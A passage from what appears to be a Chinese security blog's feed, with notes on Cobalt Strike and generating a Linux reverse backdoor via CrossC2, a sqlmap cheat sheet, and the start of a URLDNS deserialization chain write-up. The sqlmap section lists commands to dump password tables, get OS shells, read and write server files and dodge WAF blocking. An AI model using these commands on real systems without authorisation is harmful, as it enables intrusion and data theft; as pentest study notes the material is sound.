    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike</title>
    <link href="/2023/08/13/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/CobaltStrike/"/>
    <url>/2023/08/13/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/CobaltStrike/</url>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h1><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>CS 分为服务端和客户端，服务端需要在 Linux 环境下执行，然后使用客户端连接服务端。</p><p>首先需要安装 Java 环境：<a href="https://www.runoob.com/java/java-environment-setup.html">https://www.runoob.com/java/java-environment-setup.html</a></p><p>然后在 Linux 平台启动服务端：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">./teamserver <span class="hljs-tag">&lt;<span class="hljs-name">host</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启动客户端，填写相应的主机、端口、密码即可：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813174358115.png" alt="image-20230813174358115" style="zoom:67%;" /><h2 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h2><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813174650590.png" alt="image-20230813174650590" style="zoom:67%;" /><p>选择合适的 Payload，填写对应的信息即可：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813174855177.png" alt="image-20230813174855177" style="zoom:67%;" /><h2 id="添加插件"><a href="#添加插件" class="headerlink" title="添加插件"></a>添加插件</h2><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813174930102.png" alt="image-20230813174930102" style="zoom:67%;" /><p>选择 <code>.cna</code> 后缀的插件加载即可使用：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813174955784.png" alt="image-20230813174955784" style="zoom:67%;" /><h2 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h2><p>CS 中大部分的操作都可以通过鼠标来完成，这里简单记录一下有些无法通过鼠标来完成的操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">执行系统命令</span><br>shell &lt;命令&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改会连间隔 - linux 无法通过鼠标完成</span><br>sleep 0<br></code></pre></td></tr></table></figure><h2 id="跨平台后门"><a href="#跨平台后门" class="headerlink" title="跨平台后门"></a>跨平台后门</h2><p>CrossC2：<a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p><p>CrossC2 用于生成 CS 的跨平台后门（ Linux 、MacOS ），其监听方式只有正向的 TCP 和 反向的 HTTPS。</p><p>这里演示生成 Linux 反向后门：</p><ol><li>创建 HTTPS 监听器</li><li>将 <code>genCrossC2</code>  放到 CS 服务端同目录并赋予可执行权限</li><li>将  <code>CrossC2.cna</code>  放到客户端本地，先修改 <code>genCrossC2</code> 的路径，然后加载该插件</li><li>客户端重新连接服务端</li><li>生成 Linux 后门，进行上线</li></ol><p>创建 https 的监听器：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813172033162.png" alt="image-20230813172033162" style="zoom:67%;" /><p>下载 <code>genCrossC2、CrossC2.cna</code>，后门的生成依赖的是 <code>genCrossC2</code> ，而 <code>CrossC2.cna</code> 插件的作用是生成使用  <code>genCrossC2</code>  的命令。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813171546115.png" alt="image-20230813171546115"></p><p><code>genCrossC2</code> 放到 CS 服务端目录下，因为其需要使用 <code>.cobaltstrike.beacon_keys</code> 文件，和监听器相关。</p><blockquote><p>注：<code>genCrossC2</code> 依赖  <code>.cobaltstrike.beacon_keys</code>  进行后门生成，所以只要有  <code>.cobaltstrike.beacon_keys</code>  即可，不是必须要在服务端的。比如可以下载 windows 版本的 <code>genCrossC2</code> ，然后将  <code>.cobaltstrike.beacon_keys</code>  放到相同目录下，以及可以正常使用。</p></blockquote><p><code>CrossC2.cna</code> 放到客户端，先修改一下其内容，主要就是填写 <code>genCrossC2</code>  文件位置，修改完成后加载该插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">CC2_PATH = <span class="hljs-string">&quot;/root/tools/Cobalt_Strike_4.5/&quot;</span>; <span class="hljs-comment"># &lt;-------- fix</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">CC2_BIN = <span class="hljs-string">&quot;genCrossC2.Linux&quot;</span>;</span><br></code></pre></td></tr></table></figure><p>之后生成后门：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813172543301.png" alt="image-20230813172543301"></p><p>选择创建的 HTTPS 监听器：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813173057687.png" alt="image-20230813173057687" style="zoom:67%;" /><p>之后在服务端执行该命令即可：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813173150069.png" alt="image-20230813173150069"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813173306068.png" alt="image-20230813173306068"></p><p>成功上线：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230813173422294.png" alt="image-20230813173422294"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NMAP</title>
    <link href="/2023/08/13/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/nmap/"/>
    <url>/2023/08/13/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/nmap/</url>
    
    <content type="html"><![CDATA[<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312102806.png" alt="nmap"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLMAP</title>
    <link href="/2023/08/13/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/sqlmap/"/>
    <url>/2023/08/13/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/sqlmap/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="等级指定"><a href="#等级指定" class="headerlink" title="等级指定"></a>等级指定</h2><p>不同等级的 <code>payload</code> 都存储在 <code>xml/payloads.xml</code> 中；</p><h3 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attr">--level</span> <span class="hljs-selector-attr">[1~5]</span><br></code></pre></td></tr></table></figure><ul><li><code>Cookie</code>：2</li><li><code>User-Agent、Referer</code>：3</li></ul><h3 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attr">--risk</span> <span class="hljs-selector-attr">[1~4]</span><br></code></pre></td></tr></table></figure><p>默认是 1 会测试大部分的测试语句，2 会增加基于事件的测试语句，3 会增加 OR 语句的 SQL 注入测试。</p><h3 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">string</span><span class="hljs-string">,</span><span class="hljs-literal">--</span><span class="hljs-comment">not</span><span class="hljs-literal">-</span><span class="hljs-comment">string</span><span class="hljs-string">,</span><span class="hljs-literal">--</span><span class="hljs-comment">regexp</span><span class="hljs-string">,</span><span class="hljs-literal">--</span><span class="hljs-comment">code</span><br></code></pre></td></tr></table></figure><p>默认情况下 sqlmap 通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致 sqlmap 的误判。</p><p>此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用 <code>--string</code> 参数添加字符串，<code>--regexp</code> 添加正则 ），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（ <code>--not-string</code> 添加）。用户也可以提供真与假条件返回的 HTTP 状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数 <code>--code=200</code>。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">-<span class="hljs-type">text</span>-<span class="hljs-keyword">only</span>,<span class="hljs-comment">--titles</span><br></code></pre></td></tr></table></figure><p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用 <code>--text-only</code>（HTTP响应体中不同）<code>--titles</code>（ HTML的 title 标签中不同）。</p><h2 id="指定目标"><a href="#指定目标" class="headerlink" title="指定目标"></a>指定目标</h2><h3 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">HTTP 数据包, 在要测试的地方加上 *  ( 最方便 )</span> <br>sqlmap -r http.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">GET 请求</span><br>sqlmap -u &quot;url&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">POST 请求</span><br>sqlmap -u &quot;url&quot; --data=&quot;请求数据&quot; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">拆分参数</span><br>sqlmap -u &quot;url&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">批量测试</span><br>sqlmap -l targets.txt<br></code></pre></td></tr></table></figure><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><h4 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h4><p>Cookie：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">cookie</span><span class="hljs-string">,</span><span class="hljs-literal">--</span><span class="hljs-comment">load</span><span class="hljs-literal">-</span><span class="hljs-comment">cookies</span><span class="hljs-string">,</span><span class="hljs-literal">--</span><span class="hljs-comment">drop</span><span class="hljs-literal">-</span><span class="hljs-comment">set</span><span class="hljs-literal">-</span><span class="hljs-comment">cookie</span><br></code></pre></td></tr></table></figure><p>User-Agent：防止 WAF 因为 UA 头给封掉了</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">--user-<span class="hljs-built_in">agent</span>,--<span class="hljs-built_in">random</span>-<span class="hljs-built_in">agent</span><br></code></pre></td></tr></table></figure><p>其他字段添加：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--referer</span><br><span class="hljs-comment">--headers</span><br></code></pre></td></tr></table></figure><h4 id="认证保护"><a href="#认证保护" class="headerlink" title="认证保护"></a>认证保护</h4><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">auth</span><span class="hljs-literal">-</span><span class="hljs-comment">type</span><span class="hljs-string">,</span><span class="hljs-literal">--</span><span class="hljs-comment">auth</span><span class="hljs-literal">-</span><span class="hljs-comment">cred</span><br></code></pre></td></tr></table></figure><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">--proxy http://url:port<br><span class="hljs-meta prompt_"># </span><span class="language-bash">认证密码</span><br>--proxy-cred username:password<br><span class="hljs-meta prompt_"># </span><span class="language-bash">拒绝使用本地局域网的HTTP(S)代理</span><br>--ignore-proxy<br></code></pre></td></tr></table></figure><h4 id="请求延迟"><a href="#请求延迟" class="headerlink" title="请求延迟"></a>请求延迟</h4><p>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--delay</span><br></code></pre></td></tr></table></figure><h4 id="设定超时时间"><a href="#设定超时时间" class="headerlink" title="设定超时时间"></a>设定超时时间</h4><p>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--timeout</span><br></code></pre></td></tr></table></figure><h4 id="设定重试超时"><a href="#设定重试超时" class="headerlink" title="设定重试超时"></a>设定重试超时</h4><p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--retries</span><br></code></pre></td></tr></table></figure><h4 id="设定随机改变的参数值"><a href="#设定随机改变的参数值" class="headerlink" title="设定随机改变的参数值"></a>设定随机改变的参数值</h4><p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--randomize</span><br></code></pre></td></tr></table></figure><h4 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attr">--scope</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -l burp<span class="hljs-selector-class">.log</span> <span class="hljs-attr">--scope</span>=<span class="hljs-string">&quot;(www)?\.target\.(com|net|org)&quot;</span><br></code></pre></td></tr></table></figure><h4 id="避免过多的错误请求被屏蔽"><a href="#避免过多的错误请求被屏蔽" class="headerlink" title="避免过多的错误请求被屏蔽"></a>避免过多的错误请求被屏蔽</h4><p>参数：–safe-url,–safe-freq<br>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发<br>这个策略，导致以后无法进行。<br>绕过这个策略有两种方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">提供一个安全不错误的连接，每隔一段时间都会去访问一下</span><br>--safe-url<br><span class="hljs-meta prompt_"># </span><span class="language-bash">提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</span><br>--safe-freq<br></code></pre></td></tr></table></figure><h4 id="关掉URL参数值编码"><a href="#关掉URL参数值编码" class="headerlink" title="关掉URL参数值编码"></a>关掉URL参数值编码</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--skip-urlencode</span><br></code></pre></td></tr></table></figure><h4 id="每次请求时候执行自定义的python代码"><a href="#每次请求时候执行自定义的python代码" class="headerlink" title="每次请求时候执行自定义的python代码"></a>每次请求时候执行自定义的python代码</h4><p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">上面的请求就是每次请求时根据<span class="hljs-built_in">id</span>参数值，做一次md5后作为<span class="hljs-built_in">hash</span>参数的值</span><br>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import<br>hashlib;hash=hashlib.md5(id).hexdigest()&quot;<br></code></pre></td></tr></table></figure><h2 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">手动指定要测试的参数</span><br>-p <br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定要跳过的参数</span><br>--skip<br><span class="hljs-meta prompt_"># </span><span class="language-bash">加 * 表示要测试的参数</span><br>python sqlmap.py -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定数据库类型 ( mysql、oracle ... )</span><br>--dbms<br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定数据库服务器系统</span><br>--os<br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定无效的大数字-指定一个报错的数值时</span><br>--invalid-bignum<br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定无效的逻辑,可以指定<span class="hljs-built_in">id</span>=13把原来的<span class="hljs-built_in">id</span>=-13的报错改成<span class="hljs-built_in">id</span>=13 AND 18=19</span><br>--invalid-logical<br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定 payload 的前缀后缀</span><br>--prefix,--suffix<br></code></pre></td></tr></table></figure><h2 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h2><h3 id="指定注入方式"><a href="#指定注入方式" class="headerlink" title="指定注入方式"></a>指定注入方式</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--technique</span><br></code></pre></td></tr></table></figure><ul><li>B: Boolean-based blind SQL injection</li><li>E: Error-based SQL injection</li><li>U: UNION query SQL injection</li><li>S: Stacked queries SQL injection</li><li>T: Time-based blind SQL injection</li></ul><h3 id="设定延迟注入的时间"><a href="#设定延迟注入的时间" class="headerlink" title="设定延迟注入的时间"></a>设定延迟注入的时间</h3><p>当使用继续时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">--<span class="hljs-built_in">time</span>-<span class="hljs-built_in">sec</span><br></code></pre></td></tr></table></figure><h3 id="设定UNION查询字段数"><a href="#设定UNION查询字段数" class="headerlink" title="设定UNION查询字段数"></a>设定UNION查询字段数</h3><p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">--<span class="hljs-built_in">union</span>-<span class="hljs-built_in">cols</span><br></code></pre></td></tr></table></figure><h3 id="设定UNION查询使用的字符"><a href="#设定UNION查询使用的字符" class="headerlink" title="设定UNION查询使用的字符"></a>设定UNION查询使用的字符</h3><p>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用 <code>--union-char</code> 只定UNION查询的字符。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">--<span class="hljs-keyword">union</span>-<span class="hljs-type">char</span><br></code></pre></td></tr></table></figure><h3 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h3><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。<code>--second-order</code>后门跟一个判断页面的URL地址。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--second-order</span><br></code></pre></td></tr></table></figure><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b,--banner<br>-current-user<br>--current-db<br>--is-dba<br>--users<br>--passwords<br>--privileges# 权限<br>--roles# oracle 角色<br>--dbs<br>--tables,--exclude-sysdbs,-D<br>--columns,-C,-T,-D<br>-schema,--exclude-sysdbs# 表结构<br>--count<br>--dump,-C,-T,-D,--start,--stop,--first,--last# 获取整个表的信息<br>--dump-all,--exclude-sysdbs# 获取所有数据库<br>--search,-C,-T,-D# 搜索<br>--sql-query,--sql-shell# 运行自定义的SQL语句<br></code></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--common-tables</span><br><span class="hljs-comment">--common-columns</span><br></code></pre></td></tr></table></figure><h2 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--udf-inject</span><br><span class="hljs-comment">--shared-lib</span><br></code></pre></td></tr></table></figure><h2 id="系统文件操作"><a href="#系统文件操作" class="headerlink" title="系统文件操作"></a>系统文件操作</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">--<span class="hljs-keyword">file</span>-<span class="hljs-keyword">read</span><br>--<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>,--<span class="hljs-keyword">file</span>-dest<br></code></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">--os-cmd,--os-shell<br>--sql-shell <br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sqlmap.<span class="hljs-keyword">py</span> -d mysql://roo<span class="hljs-variable">t:root</span>@xx.xx.xx.xx:<span class="hljs-number">3306</span>/test --os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h2 id="配合MSF"><a href="#配合MSF" class="headerlink" title="配合MSF"></a>配合MSF</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1&quot;</span> <span class="hljs-params">--os-pwn</span> <span class="hljs-params">--msf-path</span> <span class="hljs-string">/software/metasploit</span><br></code></pre></td></tr></table></figure><h2 id="其他参数-1"><a href="#其他参数-1" class="headerlink" title="其他参数"></a>其他参数</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">非交互模式</span><br>--batch<br><span class="hljs-meta prompt_"># </span><span class="language-bash">爬行网站深度</span><br>--crawl=3<br><span class="hljs-meta prompt_"># </span><span class="language-bash">定义数据格式 csv,html</span><br>--dump-format <br><span class="hljs-meta prompt_"># </span><span class="language-bash">线程大小</span><br>--threads=1 <br></code></pre></td></tr></table></figure><h2 id="常用-Payload"><a href="#常用-Payload" class="headerlink" title="常用 Payload"></a>常用 Payload</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u &quot;url&quot; --dbms mysql --current-user --current-db --is-dba --passwords -v 1<br>sqlmap -u &quot;url&quot; --dbms mysql -v 1 -D pikachu --tables<br>sqlmap -u &quot;url&quot; --dbms mysql -v 1 -D pikachu -T users --columns<br>sqlmap -u &quot;url&quot; --dbms mysql -v 1 -D pikachu -tables --columns<br>sqlmap -u &quot;url&quot; --dbms mysql -v 1 -D pikachu -tables --columns --dump<br>sqlmap -u &quot;url&quot; --dbms mysql -v 1 -D pikachu -T users -C &quot;id,username,password&quot; --dump<br>sqlmap -u &quot;url&quot; --dbms mysql -v 3 -D --random-agent<br><span class="hljs-meta prompt_"># </span><span class="language-bash">宽字节注入</span><br>sqlmap -u &quot;url&quot; --dbms mysql --tamper &quot;unmagicquotes.py&quot; -v 4<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Base64 注入</span><br>sqlmap -u &quot;url&quot; --tamper &quot;base64encode.py&quot; -v 4 --level 3<br>sqlmap --list-tampers<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS 利用链</title>
    <link href="/2023/08/05/Java%E5%AE%89%E5%85%A8/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2023/08/05/Java%E5%AE%89%E5%85%A8/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="URLDNS-利用链"><a href="#URLDNS-利用链" class="headerlink" title="URLDNS 利用链"></a>URLDNS 利用链</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>URLDNS 是 <code>ysoserial</code> 中一个利用链的名字，它适合检测反序列化漏洞是否存在，优点如下：</p><ul><li>使用 Java 内置类构造，对第三方库没有依赖</li><li>在目标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞</li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>该利用链调用流程如下：</p><ol><li><code>HashMap.readObject()</code> &#x3D;&gt; <code>HashMap.putVal()</code> &#x3D;&gt; <code>HashMap.hash()</code></li><li><code>URL.hashCode()</code> &#x3D;&gt; <code>URLStreamHandler.hashCode()</code> &#x3D;&gt; <code>getHostAddress()</code></li></ol><p>入口类 <code>HashMap</code> 重写了 <code>readObject()</code> 方法，在该方法中，最终调用了 <code>HashMap.hash()</code> 方法，该方法会调用  <code>getHostAddress()</code> 方法进行 DNS 请求。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>先使用  <code>ysoserial</code> 生成 payload，然后创建一个反序列化入口去调试：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">java -jar ysoserial-<span class="hljs-built_in">all</span>.jar URLDNS 